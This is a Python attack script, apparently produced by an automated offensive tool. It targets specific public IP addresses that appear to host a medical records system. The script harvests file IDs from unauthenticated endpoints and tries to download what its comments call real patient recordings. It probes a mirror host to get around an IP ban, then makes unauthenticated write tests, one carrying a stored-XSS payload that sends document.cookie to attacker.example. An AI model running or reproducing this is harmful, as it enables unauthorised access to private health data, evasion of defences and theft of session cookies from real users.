#!/usr/bin/env python3
"""
Stage 3: 从 :3100 /videoData 提取真实 fileId → 下载真实患者录像 + 探测 :3100/fileId 路径 + 118.163.107.93 镜像 NOAUTH 写入
"""
import json
import subprocess
import time

def curl_capture(url, method="GET", body=None, headers=None, timeout=15):
    cmd = ["curl", "-sS", "-k", "-o", "-", "-w", "\n[STATUS=%{http_code} SIZE=%{size_download} TIME=%{time_total}]",
           "-X", method, "-H", "User-Agent: Mozilla/5.0 (Pentest)"]
    if headers:
        for k, v in headers.items():
            cmd += ["-H", f"{k}: {v}"]
    if body:
        cmd += ["-H", "Content-Type: application/json", "-d", json.dumps(body)]
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        out = r.stdout
        if "[STATUS=" in out:
            idx = out.rfind("[STATUS=")
            meta = out[idx:].strip()
            body_str = out[:idx].rstrip()
            return meta, body_str
        return "[NO META]", out
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]", ""
    except Exception as e:
        return f"[ERR {e}]", ""

def curl_download(url, outfile, timeout=15):
    """真实下载到文件"""
    cmd = ["curl", "-sS", "-k", "-o", outfile, "-w",
           "\n[STATUS=%{http_code} SIZE=%{size_download} TIME=%{time_total} CT=%{content_type}]",
           "-X", "GET",
           "-H", "User-Agent: Mozilla/5.0 (Pentest)",
           url]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERR {e}]"

def main():
    print(f"[*] Stage 3: fileId 真实下载 + 镜像探测 - {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"="*100)

    # ===== Step 1: 从 :3100/videoData 提取真实 fileId =====
    print("\n[STEP 1] GET :3100/videoData 提取真实 fileId")
    meta, body = curl_capture("http://35.234.50.28:3100/videoData")
    print(f"  {meta}")
    print(f"  body 前 800B: {body[:800]}")
    try:
        j = json.loads(body)
        if isinstance(j, list):
            print(f"  共 {len(j)} 条录像元数据")
            # 取前 3 个不同 fileId
            seen = set()
            samples = []
            for it in j[:20]:
                fid = it.get("fileId")
                if fid and fid not in seen:
                    seen.add(fid)
                    samples.append((it.get("recordUuid"), fid, it.get("fileName"), it.get("mimeType")))
                    if len(samples) >= 3:
                        break
            print("  samples (recordUuid, fileId, fileName, mimeType):")
            for s in samples:
                print(f"    {s}")
        else:
            print(f"  JSON 不是 list: {type(j)}")
    except Exception as e:
        print(f"  JSON 解析失败: {e}")

    # ===== Step 2: 从 :3100/imageData 提取真实 fileId =====
    print("\n[STEP 2] GET :3100/imageData 提取真实 fileId")
    meta, body = curl_capture("http://35.234.50.28:3100/imageData")
    print(f"  {meta}")
    try:
        j = json.loads(body)
        if isinstance(j, list):
            print(f"  共 {len(j)} 条图像元数据")
            seen = set()
            samples = []
            for it in j[:20]:
                fid = it.get("fileId")
                if fid and fid not in seen:
                    seen.add(fid)
                    samples.append((it.get("recordUuid"), fid, it.get("fileName"), it.get("mimeType")))
                    if len(samples) >= 3:
                        break
            print("  samples (recordUuid, fileId, fileName, mimeType):")
            for s in samples:
                print(f"    {s}")
    except Exception as e:
        print(f"  JSON 解析失败: {e}")

    # ===== Step 3: 从 :3100/events 提取真实 id =====
    print("\n[STEP 3] GET :3100/events 提取真实 id")
    meta, body = curl_capture("http://35.234.50.28:3100/events")
    print(f"  {meta}")
    try:
        j = json.loads(body)
        if isinstance(j, list):
            print(f"  共 {len(j)} 条事件日志")
            for it in j[:5]:
                print(f"    id={it.get('id')}, CaseID={it.get('CaseID')}, recordUuid={it.get('recordUuid')}, Caption={it.get('Caption')}")
    except Exception as e:
        print(f"  JSON 解析失败: {e}")

    # ===== Step 4: 探测 fileId 多种构造 =====
    print("\n[STEP 4] 探测 fileId 多种路径构造")
    file_id_probes = [
        ("/videoData/getFile/1", "video fileId=1"),
        ("/videoData/1", "video id=1"),
        ("/videoData/getFile?fileId=1", "video query fileId=1"),
        ("/videoData/1/file", "video nested path"),
        ("/imageData/getFile/1", "image fileId=1"),
        ("/imageData/1", "image id=1"),
        ("/imageData/getFile?fileId=1", "image query fileId=1"),
    ]
    for path, desc in file_id_probes:
        meta, body = curl_capture(f"http://35.234.50.28:3100{path}")
        marker = "[200]" if "200" in meta else ("[拒]" if "SIZE=35B" in meta else "[超时]")
        preview = body[:100].replace("\n", " ")
        print(f"  {marker} {desc:35s} {path:35s} {meta}  {preview}")

    # ===== Step 5: 真实文件下载 (无 JWT 测 + 带 JWT 测) =====
    print("\n[STEP 5] 真实文件下载测试")
    out_dir = "/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8"
    # 试 :3100/videoData/getFile/1
    result = curl_download("http://35.234.50.28:3100/videoData/getFile/1",
                            f"{out_dir}/dl_video_1.bin")
    print(f"  /videoData/getFile/1 下载: {result}")
    # 试 :3100/imageData/getFile/1
    result = curl_download("http://35.234.50.28:3100/imageData/getFile/1",
                            f"{out_dir}/dl_image_1.bin")
    print(f"  /imageData/getFile/1 下载: {result}")
    # 试 :3100/videoData/1
    result = curl_download("http://35.234.50.28:3100/videoData/1",
                            f"{out_dir}/dl_video_id1.bin")
    print(f"  /videoData/1 下载: {result}")

    # ===== Step 6: 118.163.107.93 镜像探测 =====
    print("\n[STEP 6] 118.163.107.93 镜像端点探测 (绕主域 IP 封禁)")
    mirror_targets = [
        ("http://118.163.107.93:4001/", "GET", None),
        ("http://118.163.107.93:4001/config", "GET", None),
        ("http://118.163.107.93:4001/events", "GET", None),
        ("http://118.163.107.93:4001/events/100", "GET", None),
        ("http://118.163.107.93:4008/", "GET", None),
        ("http://118.163.107.93:4008/config", "GET", None),
        ("http://118.163.107.93:4008/MciTypes", "GET", None),
        ("http://118.163.107.93:4008/MciCaseRecords", "GET", None),
        ("http://118.163.107.93:3400/", "GET", None),
        ("http://118.163.107.93:3400/config", "GET", None),
        ("http://118.163.107.93:3800/", "GET", None),
        ("http://118.163.107.93:8000/config", "GET", None),
        ("http://118.163.107.93:3100/videoData", "GET", None),
    ]
    for url, method, body in mirror_targets:
        meta, body = curl_capture(url, method=method, body=body)
        marker = "[200]" if "200" in meta else ("[拒]" if "401" in meta or "404" in meta else "[超时/异常]")
        preview = body[:150].replace("\n", " ")
        print(f"  {marker} {method} {url:55s} {meta}  {preview}")

    # ===== Step 7: 镜像 NOAUTH 写入测试 =====
    print("\n[STEP 7] 118.163.107.93 镜像 NOAUTH 写入测试")
    write_tests = [
        ("http://118.163.107.93:4001/events", "POST",
         {"CaseID": "TestCaseMirror401", "TypeOfEventTxt": "MIRROR_PENTEST_V37_XSS",
          "Annotation": "<svg onload=fetch('https://attacker.example/?c='+document.cookie) src=x>"}),
        ("http://118.163.107.93:4008/MciTypes", "POST",
         {"name": "MIRROR_TEST_TYPE_4008_V37"}),
    ]
    for url, method, body in write_tests:
        meta, body_resp = curl_capture(url, method=method, body=body)
        marker = "[200]" if "200" in meta else ("[201]" if "201" in meta else "[拒]")
        preview = body_resp[:200].replace("\n", " ")
        print(f"  {marker} {method} {url:55s} {meta}  {preview}")

if __name__ == "__main__":
    main()